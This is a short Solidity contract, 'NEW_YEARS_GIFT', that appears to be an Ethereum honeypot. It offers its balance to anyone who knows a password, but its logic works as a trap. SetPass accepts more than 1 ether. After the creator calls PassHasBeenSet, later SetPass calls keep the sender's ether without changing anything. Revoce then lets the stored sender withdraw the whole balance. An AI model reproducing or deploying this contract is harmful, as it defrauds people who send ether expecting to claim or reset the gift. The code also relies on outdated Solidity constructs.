1 pragma solidity ^0.4.19;
2 
3 contract NEW_YEARS_GIFT
4 {
5     string message;
6     
7     bool passHasBeenSet = false;
8     
9     address sender;
10     
11     bytes32 public hashPass;
12 	
13 	function() public payable{}
14     
15     function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
16     
17     function SetPass(bytes32 hash)
18     public
19     payable
20     {
21         if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
22         {
23             hashPass = hash;
24             sender = msg.sender;
25         }
26     }
27     
28     function SetMessage(string _message)
29     public
30     {
31         if(msg.sender==sender)
32         {
33             message =_message;
34         }
35     }
36     
37     function GetGift(bytes pass)
38     external
39     payable
40     returns (string)
41     {
42         if(hashPass == sha3(pass))
43         {
44             msg.sender.transfer(this.balance);
45             return message;
46         }
47     }
48     
49     function Revoce()
50     public
51     payable
52     {
53         if(msg.sender==sender)
54         {
55             sender.transfer(this.balance);
56             message="";
57         }
58     }
59     
60     function PassHasBeenSet(bytes32 hash)
61     public
62     {
63         if(msg.sender==sender&&hash==hashPass)
64         {
65            passHasBeenSet=true;
66         }
67     }
68 }